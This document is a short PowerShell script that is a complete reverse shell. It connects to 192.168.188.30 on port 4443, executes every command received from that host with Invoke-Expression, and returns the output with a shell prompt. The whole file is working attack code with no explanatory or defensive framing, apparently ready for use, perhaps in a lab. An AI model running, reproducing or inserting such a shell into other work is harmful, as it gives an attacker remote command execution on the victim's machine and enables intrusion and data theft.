$client = New-Object System.Net.Sockets.TCPClient('192.168.188.30', 4443)
$stream = $client.GetStream()
$bytes = [byte[]](0..65535)
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    $sendbyte = [text.encoding]::ASCII.GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
